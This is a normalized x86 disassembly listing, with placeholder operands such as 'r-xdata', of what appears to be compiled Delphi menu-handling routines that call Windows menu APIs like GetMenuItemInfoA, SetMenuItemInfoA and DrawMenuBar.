cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_446f1c
jmp r-xdata
xor edx edx
mov eax esi
call sub_4449e0
sub_446f1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4423b4
mov eax ebx
call sub_446f8c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_4423f8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419dac
sub_446f64
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_446f64
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4440b4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4469f8
mov eax ebx
pop esi
pop ebx
retn
sub_446fa0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c004
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404414
sub_446fd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f4c
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_447054
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_447176
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404174
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404174
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4043d4
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c0
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44717d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40445c
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404234
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404174
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4043d4
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404234
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_4471b4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_447653
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f4c
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447614
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4465f4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44765a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403ed8
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403ed8
lea eax [ ebp - 0x18 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
call sub_447808
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_446604
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_446fd0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_446604
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446604
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f8
mov eax [ ebp - 0x20 ]
call sub_4030f8
mov eax [ ebp - 0x14 ]
call sub_4030f8
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_446fd0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404174
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_446604
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_4490ac
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407998
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f08
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c004
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c004
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446604
push eax
mov edx esi
mov eax ebx
call sub_446604
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4043d4
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407998
push ebp
mov eax [ ebp - 0x2c ]
call sub_446fa0
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_446fa0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c004
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f4c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446604
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_446604
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_449018
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f08
mov edx esi
mov eax ebx
call sub_446604
push eax
mov edx esi
mov eax ebx
call sub_446604
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404174
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4043d4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_447054
mov eax [ ebp - 0x18 ]
call sub_404174
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404414
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_40445c
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_447054
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4476b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4465f4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4465f4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_447834
test al al
je r-xdata
mov eax esi
call sub_4465f4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446604
call sub_44768c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_446604
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446604
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_446604
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446604
call sub_44768c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446604
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446604
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446604
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_446604
call sub_44768c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_447808
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_447808
and eax 0x7f
mov al [ eax + rw-data ]
sub_447834
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_447834
and eax 0x7f
mov al [ eax + rw-data ]
sub_447860
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444548
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419cdc
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44858c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4478fc
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4030f8
mov eax [ esi + 0x44 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_447970
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_447970
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4440b4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4469f8
mov eax ebx
pop esi
pop ebx
retn
sub_4479b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4465f4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_446604
call sub_4479b0
pop ecx
test al al
je r-xdata
sub_447a48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4479b0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4440b4
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_447a78
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_447a48
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_448d9c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_447ae8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_447a48
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_447b04
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_447a48
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_4471b4
mov ebx eax
xor edx edx
mov eax edi
call sub_4476b0
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_446b1c
mov eax [ esi + 0x34 ]
call sub_446b1c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_444a58
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43b290
push eax
call DrawMenuBar
sub_447bf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_447bf0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_447d15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_447a48
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_446b1c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_447be0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_447d44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_422a58
xor eax eax
push ebp
push sub_447e42
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422a58
xor eax eax
push ebp
push sub_447e17
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_447bf0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422a50
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e49
mov eax [ rw-data ]
call sub_422a50
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_447a48
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_447e68
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4481ec
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4481ec
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_447f24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4484c0
mov eax ebx
call sub_4083e8
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_447fc4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_447f24
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404124
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404374
lea edx [ ebp - 0x200 ]
call sub_4084ac
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_448058
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
